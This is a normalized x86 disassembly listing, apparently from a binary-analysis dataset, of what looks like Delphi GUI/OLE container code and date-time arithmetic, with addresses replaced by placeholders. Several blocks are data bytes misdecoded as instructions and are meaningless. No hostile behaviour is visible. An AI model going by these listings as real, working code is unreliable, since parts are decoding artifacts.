je r-xdata
mov ebx edi
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x22f ] 0x1
jne r-xdata
mov eax [ ebp + 0x4 ]
push eax
mov eax [ esi + 0x230 ]
push eax
mov eax [ eax ]
call [ eax + 0x1c ]
cmp [ ebp + 0x4 ] 0x0
jne r-xdata
push 0x0
push 0x0
push 0x0
push esi
call sub_468558
sub_467d12
mov eax eax
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4460e0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
test [ eax + 0x2c ] 0x1
je r-xdata
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x249 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_446ee8
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x249 ] 0x1
xor eax eax
push ebp
push sub_467d8d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x70 ]
mov edx 0xfffffe0b
mov eax [ ebp - 0x4 ]
call sub_467388
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x249 ] 0x0
retn
sub_467d98
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_446098
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
test [ eax + 0x2c ] 0x8
je r-xdata
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x24b ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_446ee8
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x24b ] 0x1
xor eax eax
push ebp
push sub_467e17
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x50 ]
neg al
sbb ecx ecx
mov edx 0xfffffdfe
mov eax [ ebp - 0x4 ]
call sub_467474
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x24b ] 0x0
retn
sub_467e24
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_467f19
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_446108
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
test [ eax + 0x2c ] 0x6
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_467f20
lea eax [ ebp - 0x14 ]
call sub_40f1fc
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x24a ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_446ee8
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x24a ] 0x1
xor eax eax
push ebp
push sub_467efc
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
test [ eax + 0x2c ] 0x2
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
test [ eax + 0x2c ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x68 ]
mov ecx [ eax + 0x18 ]
mov edx 0xfffffdff
mov eax [ ebp - 0x4 ]
call sub_4673a8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x24a ] 0x0
retn
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x68 ]
call sub_465e64
lea ecx [ ebp - 0x14 ]
mov edx 0xfffffe00
mov eax [ ebp - 0x4 ]
call sub_4677e0
sub_467f24
push ebx
push esi
push edi
add esp 0xffffffd0
mov edi edx
mov ebx eax
mov eax ebx
mov si 0xffb8
call sub_403448
test al al
je r-xdata
mov edx edi
mov eax ebx
call sub_446028
mov [ esp + 0x4 ] 0x10
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x220 ]
push eax
mov eax [ eax ]
call [ eax + 0xc ]
test eax eax
jne r-xdata
cmp [ esp + 0xc ] 0x0
je r-xdata
lea eax [ esp + 0x14 ]
xor ecx ecx
mov edx 0x1c
call sub_402c58
mov eax ebx
call sub_446be4
mov [ esp + 0x14 ] eax
mov [ esp + 0x18 ] 0x100
mov eax [ edi + 0x4 ]
mov [ esp + 0x1c ] eax
mov eax [ edi + 0x8 ]
mov [ esp + 0x20 ] eax
push esp
lea eax [ esp + 0x18 ]
push eax
movzx eax [ esp + 0x14 ]
push eax
mov eax [ esp + 0x14 ]
push eax
call IsAccelerator
test eax eax
je r-xdata
lea eax [ esp + 0x14 ]
push eax
mov eax [ ebx + 0x220 ]
push eax
mov eax [ eax ]
call [ eax + 0x10 ]
mov [ edi + 0xc ] 0x1
jmp r-xdata
add esp 0x30
pop edi
pop esi
pop ebx
retn
sub_467fdc
push ebx
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_457218
test eax eax
je r-xdata
mov edx esp
mov eax ebx
call sub_43fd64
push esp
mov eax ebx
call sub_4469e0
push eax
push 0x0
mov eax ebx
test eax eax
je r-xdata
cmp ebx [ eax + 0x27c ]
je r-xdata
push eax
push 0x0
push 0xfffffffc
mov eax [ ebx + 0x218 ]
push eax
mov eax [ eax ]
call [ eax + 0x2c ]
sub eax 0xfffffd9c
add esp 0x10
pop ebx
retn
sub_46802c
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_457218
mov esi eax
test esi esi
je r-xdata
cmp [ ebx + 0x22c ] 0x0
je r-xdata
cmp ebx [ esi + 0x27c ]
jne r-xdata
test esi esi
je r-xdata
mov eax [ ebx + 0x22c ]
push eax
mov eax [ eax ]
call [ eax + 0x18 ]
pop esi
pop ebx
retn
cmp ebx [ esi + 0x220 ]
jne r-xdata
push 0x0
push ebx
call sub_468420
sub_468074
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_403300
test al al
je r-xdata
mov eax 0x80004002
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn 0xc
sub_468128
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov ebx [ ebp + 0x8 ]
lea eax [ ebp - 0xc ]
push eax
push 0x1
mov eax [ ebx + 0x218 ]
push eax
mov eax [ eax ]
call [ eax + 0x48 ]
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
push 0x9ec
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x40 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call MulDiv
mov esi eax
push 0x9ec
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x40 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call MulDiv
mov edi eax
test [ ebx + 0x23d ] 0x4
je r-xdata
push esi
push edi
mov ecx [ ebx + 0x44 ]
mov edx [ ebx + 0x40 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x84 ]
cmp [ ebx + 0x220 ] 0x0
jne r-xdata
cmp esi 0x20
jle r-xdata
cmp edi 0x20
jle r-xdata
mov esi 0x20
mov edi 0x20
sub_4681fc
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi [ ebp + 0x10 ]
mov ebx [ ebp + 0xc ]
test [ ebp + 0x14 ] 0x4
je r-xdata
fld [ esi ]
fmul [ r-xdata ]
mov eax [ rw-data ]
mov eax [ eax ]
fild [ eax + 0x40 ]
fdivp st1
call sub_402a14
mov [ ebx ] eax
fld [ esi + 0x4 ]
fmul [ r-xdata ]
mov eax [ rw-data ]
mov eax [ eax ]
fild [ eax + 0x40 ]
fdivp st1
call sub_402a14
mov [ ebx + 0x4 ] eax
push 0x9ec
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x40 ]
push eax
mov eax [ ebx ]
push eax
call MulDiv
mov [ ebp - 0x4 ] eax
fild [ ebp - 0x4 ]
fstp [ esi ]
fwait
push 0x9ec
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x40 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call MulDiv
mov [ ebp - 0x4 ] eax
fild [ ebp - 0x4 ]
fstp [ esi + 0x4 ]
fwait
jmp r-xdata
xor eax eax
pop esi
pop ebx
pop ecx
pop ebp
retn 0x10
sub_4682cc
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
xor edi edi
mov eax ebx
call sub_4469e0
mov [ esi ] eax
cmp [ esi ] 0x0
jne r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
mov edi 0x80004005
sub_468304
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
lea eax [ ebx + 0x22c ]
call sub_4059cc
push eax
push r-xdata
mov eax [ ebx + 0x218 ]
push eax
mov eax [ eax ]
call [ eax ]
lea eax [ ebx + 0x230 ]
call sub_4059cc
push eax
push r-xdata
mov eax [ ebx + 0x218 ]
push eax
mov eax [ eax ]
call [ eax ]
xor eax eax
pop ebx
pop ebp
retn 0x4
sub_46834a
add [ eax ] al
adc eax [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
rol [ eax ] 0x0
add [ eax ] al
add [ eax ] al
inc esi
pop ss
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add al al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov dl 0x1
call sub_467790
xor eax eax
pop ebp
retn 0x4
sub_468380
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi [ ebp + 0x1c ]
mov ebx [ ebp + 0x8 ]
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
xor edx edx
mov [ eax ] edx
mov eax [ ebp + 0xc ]
mov edx ebx
test edx edx
je r-xdata
xor edx edx
mov [ eax ] edx
call sub_4059e4
mov eax [ ebp + 0x10 ]
call sub_4059cc
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_43fd64
mov eax [ ebp + 0x14 ]
push esi
lea esi [ ebp - 0x10 ]
mov edi eax
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
push 0x7fff
push 0x7fff
push 0x0
push 0x0
mov eax [ ebp + 0x18 ]
push eax
call SetRect
xor eax eax
mov [ esi + 0x4 ] eax
mov eax ebx
call sub_4469f8
mov [ esi + 0x8 ] eax
xor eax eax
mov [ esi + 0xc ] eax
xor eax eax
mov [ esi + 0x10 ] eax
xor eax eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x18
sub edx 0xfffffda8
sub_468420
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push 0x0
push 0x0
push 0x0
push ebx
call sub_468558
xor edx edx
mov eax ebx
call sub_467790
xor eax eax
pop ebx
pop ebp
retn 0x8
sub_468516
mov eax eax
push ebp
mov ebp esp
add esp 0xfffffff4
mov eax [ ebp + 0x8 ]
call sub_466c8c
test eax eax
je r-xdata
xor eax eax
mov esp ebp
pop ebp
retn 0xc
push 0x2
mov edx [ ebp + 0x10 ]
push edx
push 0x5
xor edx edx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x8 ] 0x2
mov [ ebp - 0x4 ] 0x4
lea ecx [ ebp - 0xc ]
mov edx [ ebp + 0xc ]
call sub_454368
sub_468558
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
call sub_466c8c
mov ebx eax
xor eax eax
test ebx ebx
je r-xdata
pop ebx
pop ebp
retn 0x10
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_4543b8
push 0x0
push 0x0
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebx + 0x38 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
call OleSetMenuDescriptor
sub_46865c
arpl [ edi - 0x78a7ffba ] ax
inc esi
add [ esi - 0x79 ] ch
inc esi
add [ ebp - 0x79 ] cl
inc esi
add [ edx - 0x79 ] al
inc esi
add [ edx ] dh
xchg [ esi ] eax
pop ds
xchg [ esi ] eax
outsb
xchg [ esi ] eax
outsb
xchg [ esi ] eax
adc al 0x87
inc esi
add [ edx ] al
xchg [ esi ] eax
int1
xchg [ esi ] al
retn
sub_4686c3
mov eax [ esi + 0x30 ]
test eax eax
je r-xdata
mov esi [ esi + 0x68 ]
cmp [ esi + 0x59 ] 0x0
je r-xdata
mov esi [ eax + 0x68 ]
jmp r-xdata
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_465e64
lea edx [ ebp - 0x20 ]
mov eax ebx
call sub_40f510
jmp sub_46877a
sub_4687b0
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_4689b4
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push j_sub_403818#3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0xc ]
sub eax 0xfffffdfe
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x24b ] 0x0
jne r-xdata
dec eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax + 0x24b ] 0x1
xor eax eax
push ebp
push sub_4688b3
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx 0xfffffdfe
mov eax [ ebp + 0x8 ]
call sub_466cdc
cmp ax 0x1
sbb edx edx
inc edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x64 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax + 0x24b ] 0x0
retn
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x24a ] 0x0
jne r-xdata
dec eax
je r-xdata
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4689bb
lea eax [ ebp - 0x10 ]
call sub_40f1fc
retn
mov eax [ ebp + 0x8 ]
mov [ eax + 0x24a ] 0x1
xor eax eax
push ebp
push sub_468975
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx 0xfffffdff
mov eax [ ebp + 0x8 ]
call sub_466c78
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x68 ]
call sub_422f54
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax + 0x24a ] 0x0
retn
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x24a ] 0x0
jne r-xdata
sub eax 0xb
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax + 0x24a ] 0x1
xor eax eax
push ebp
push sub_468918
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x10 ]
mov edx 0xfffffe00
mov eax [ ebp + 0x8 ]
call sub_466dfc
lea eax [ ebp - 0x10 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x68 ]
call sub_465eb0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax + 0x24a ] 0x0
retn
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x249 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax + 0x249 ] 0x1
xor eax eax
push ebp
push sub_468850
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx 0xfffffe0b
mov eax [ ebp + 0x8 ]
call sub_466c78
mov edx eax
mov eax [ ebp + 0x8 ]
call sub_440564
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax + 0x249 ] 0x0
retn
sub_4689ec
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_468a1d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_468a24
retn
mov eax rw-data
call sub_40f1fc
sub_468a26
mov eax eax
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_468a70
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_468a77
retn
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_419ac0
mov eax rw-data
mov edx [ rw-data ]
call sub_40f510
sub_468a7c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_468aa1
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_468aa8
retn
sub_468ab4
push ebx
push esi
mov ebx edx
mov esi eax
cmp bx 0x2
jne r-xdata
xor eax eax
jmp r-xdata
mov eax esi
call sub_409974
test al al
jne r-xdata
and eax 0x7f
lea eax [ eax + eax * 2 ]
mov edx [ rw-data ]
lea eax [ edx + eax * 8 ]
movzx edx bx
mov ax [ eax + edx * 2 - 0x2 ]
pop esi
pop ebx
retn
mov al 0x1
sub_468aec
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_468b11
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_468b18
retn
sub_468b24
push 0xe30047a6
inc [ eax ]
add [ eax - 0x5a ] ch
inc edi
add ah ah
inc [ eax ]
add [ eax - 0x5a ] ch
inc edi
add ch ah
inc [ eax ]
add [ eax - 0x5a ] ch
inc edi
add dh ah
inc [ eax ]
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_468b69
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_468b70
retn
sub_468d3f
xchg edx eax
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46090003 ] al
jb r-xdata
dec ebp
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
jae r-xdata
add [ ebp + 0x6 ] dh
adc [ eax ] 0x40
add [ esi ] cl
add [ eax ] al
call [ eax ]
xchg ebx eax
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x53060007 ] al
arpl [ gs : edi + 0x6e ] bp
cmp al 0x10
inc eax
add [ eax + eax ] al
add bh bh
sbb [ ebx + 0x10046 ] dl
add [ eax ] al
add [ ecx ] al
adc [ eax ] al
or al [ eax ]
add bh bh
clc
xchg edx eax
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x48040004 ] al
mov al 0x1
retn
xor eax eax
retn
outsd
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4d060005 ] al
imul ebp [ esi + 0x75 ] 0x10806574
inc eax
shl [ esi - 0x7d ] 0x38
add [ ebp + 0x29 ] dh
cmp [ eax + 0x2 ] 0x0
jne r-xdata
add eax [ ecx + 0x79 ]
xchg esp eax
popad
je r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
or [ eax ] al
add al 0x59
popad
jb r-xdata
adc [ eax ] 0x40
add [ eax + eax ] cl
add bh bh
add [ ebx + 0x10046 ] dl
cmp [ eax + 0x4 ] 0x0
jne r-xdata
imul ebp [ edi + 0x6e ] 0x40108073
add [ edx ] cl
add [ eax ] al
push esp
imul ebp [ ebp + 0x65 ] r-xdata
sub al 0x91
inc esi
add [ ecx + edx * 4 + 0x46 ] bl
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x41080001 ] al
jae r-xdata
add [ ebp + 0x1b ] dh
add [ esi ] al
add [ eax ] al
dec [ eax ]
xchg ebx eax
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4d050006 ] al
adc [ gs : eax ] 0x40
cmp [ eax + 0x6 ] 0x0
jne r-xdata
outsd
jne r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add al 0x0
add al 0x48
je r-xdata
cmp [ eax + 0x8 ] 0x0
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add eax 0x694d0600
outsb
jne r-xdata
imul ebp [ esi + 0x67 ] r-xdata
or [ eax ] al
add bh bh
in al dx
xchg edx eax
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x44030002 ] al
popad
jns r-xdata
cmp [ eax + 0xa ] 0x0
jne r-xdata
insd
push ebx
je r-xdata
adc [ eax ] al
adc [ eax ] al
add bh bh
hlt
cmp [ eax + 0xc ] 0x0
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x410a0000 ] al
jae r-xdata
adc [ ecx + 0x10046 ] 0x0
add [ eax ] al
add ah bl
adc al [ eax ]
inc esp
xchg ecx eax
inc esi
add [ eax + 0x1004691 ] al
sub_468dfc
cmp [ eax ] 0x0
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x2 ] 0x0
jne r-xdata
cmp [ eax + 0x4 ] 0x0
jne r-xdata
cmp [ eax + 0x6 ] 0x0
jne r-xdata
cmp [ eax + 0x8 ] 0x0
jne r-xdata
cmp [ eax + 0xa ] 0x0
jne r-xdata
cmp [ eax + 0xc ] 0x0
je r-xdata
mov al 0x1
retn
sub_468e40
push ebx
jmp r-xdata
mov cx [ eax + 0x6 ]
cmp cx 0x1
jb r-xdata
xor ecx ecx
mov cl dl
mov bx [ ecx * 4 + rw-data ]
add [ eax + 0x4 ] bx
mov cx [ ecx * 4 + rw-data ]
add [ eax + 0x6 ] cx
cmp cx 0xc
ja r-xdata
pop ebx
retn
sub_468e74
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_469000
jmp r-xdata
mov dx [ esi + 0x8 ]
cmp dx 0x1
jb r-xdata
xor edx edx
mov dl bl
mov dx [ edx * 4 + rw-data ]
add [ esi + 0x6 ] dx
test bl bl
je r-xdata
movzx edx dx
cmp eax edx
jl r-xdata
add [ esi + 0x8 ] ax
sub [ esi + 0x8 ] ax
jmp r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
call sub_468e40
mov eax esi
call sub_469000
sub_468ec8
push ebx
push esi
mov ebx edx
mov esi eax
jmp r-xdata
mov ax [ esi + 0xa ]
cmp ax 0x17
ja r-xdata
xor eax eax
mov al bl
mov dx [ eax * 4 + rw-data ]
add [ esi + 0x8 ] dx
mov ax [ eax * 4 + rw-data ]
add [ esi + 0xa ] ax
mov edx ebx
mov eax esi
call sub_468e74
movzx eax ax
test eax eax
jl r-xdata
pop esi
pop ebx
retn
sub_468f0c
push ebx
push esi
mov ebx edx
mov esi eax
jmp r-xdata
mov ax [ esi + 0xc ]
cmp ax 0x3b
ja r-xdata
xor eax eax
mov al bl
mov dx [ eax * 4 + rw-data ]
add [ esi + 0xa ] dx
mov ax [ eax * 4 + rw-data ]
add [ esi + 0xc ] ax
mov edx ebx
mov eax esi
call sub_468ec8
movzx eax ax
test eax eax
jl r-xdata
pop esi
pop ebx
retn
sub_468f50
push ebx
push esi
mov ebx edx
mov esi eax
jmp r-xdata
mov ax [ esi + 0xe ]
cmp ax 0x3b
ja r-xdata
xor eax eax
mov al bl
mov dx [ eax * 4 + rw-data ]
add [ esi + 0xc ] dx
mov ax [ eax * 4 + rw-data ]
add [ esi + 0xe ] ax
mov edx ebx
mov eax esi
call sub_468f0c
movzx eax ax
test eax eax
jl r-xdata
pop esi
pop ebx
retn
sub_468f94
push ebx
push esi
mov ebx edx
mov esi eax
test bl bl
je r-xdata
mov edx ebx
mov eax esi
call sub_468e40
mov edx ebx
mov eax esi
call sub_468e74
mov edx ebx
mov eax esi
call sub_468ec8
mov edx ebx
mov eax esi
call sub_468f0c
mov edx ebx
mov eax esi
call sub_468f50
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
call sub_468f50
mov edx ebx
mov eax esi
call sub_468f0c
mov edx ebx
mov eax esi
call sub_468ec8
mov edx ebx
mov eax esi
call sub_468e74
mov edx ebx
mov eax esi
call sub_468e40
pop esi
pop ebx
retn
sub_469018
mov cx [ edx + 0x4 ]
sub [ eax + 0x4 ] cx
mov cx [ edx + 0x6 ]
sub [ eax + 0xa ] cx
mov cx [ edx + 0x8 ]
sub [ eax + 0x8 ] cx
mov cx [ edx + 0xa ]
sub [ eax + 0xa ] cx
mov cx [ edx + 0xc ]
sub [ eax + 0xc ] cx
mov cx [ edx + 0xe ]
sub [ eax + 0xe ] cx
mov edx [ edx + 0x10 ]
sub [ eax + 0x10 ] edx
mov dl 0x1
call sub_468f94
retn
sub_469058
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_468e34
test al al
jne r-xdata
pop esi
pop ebx
retn
mov ax [ esi + 0x4 ]
add [ ebx + 0x4 ] ax
mov ax [ esi + 0x6 ]
add [ ebx + 0xa ] ax
mov ax [ esi + 0x8 ]
add [ ebx + 0x8 ] ax
mov ax [ esi + 0xa ]
add [ ebx + 0xa ] ax
mov ax [ esi + 0xc ]
add [ ebx + 0xc ] ax
mov ax [ esi + 0xe ]
add [ ebx + 0xe ] ax
mov eax [ esi + 0x10 ]
add [ ebx + 0x10 ] eax
xor edx edx
mov eax ebx
call sub_468f94
sub_4690ac
push ebx
movsx ecx [ eax + 0x4 ]
movsx ebx [ edx + 0x4 ]
sub ecx ebx
test ecx ecx
jne r-xdata
test ecx ecx
jne r-xdata
movzx ecx [ eax + 0x6 ]
movzx ebx [ edx + 0x6 ]
sub ecx ebx
test ecx ecx
jne r-xdata
movzx ecx [ eax + 0x8 ]
movzx ebx [ edx + 0x8 ]
sub ecx ebx
test ecx ecx
jne r-xdata
movzx ecx [ eax + 0xa ]
movzx ebx [ edx + 0xa ]
sub ecx ebx
test ecx ecx
jne r-xdata
movzx ecx [ eax + 0xa ]
movzx ebx [ edx + 0xa ]
sub ecx ebx
test ecx ecx
jne r-xdata
movzx ecx [ eax + 0xc ]
movzx ebx [ edx + 0xc ]
sub ecx ebx
test ecx ecx
jne r-xdata
movzx ecx [ eax + 0xe ]
movzx ebx [ edx + 0xe ]
sub ecx ebx
test ecx ecx
jne r-xdata
mov ecx [ eax + 0x10 ]
sub ecx [ edx + 0x10 ]
test ecx ecx
jle r-xdata
mov al 0x1
pop ebx
retn
xor eax eax
mov al 0x2
jmp r-xdata
pop ebx
retn
sub_46915c
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov edx esp
mov eax esi
call sub_4696f0
mov esi esp
lea edi [ ebx + 0x4 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_469180
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov ebx eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
call sub_46975c
lea esi [ ebp - 0x10 ]
lea edi [ ebx + 0x4 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_4691ac
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_40321c
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
call sub_46975c
push esi
lea edi [ esi + 0x4 ]
lea esi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403570
mov eax esi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
call sub_4035c8
pop [ fs : 0x0 ]
add esp 0xc
sub_469208
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
lea edx [ ebp - 0x10 ]
mov eax esi
call sub_4696f0
xor edx edx
mov eax edi
call sub_40321c
push edi
add edi 0x4
lea esi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403570
mov eax edi
pop edi
pop esi
pop ebx
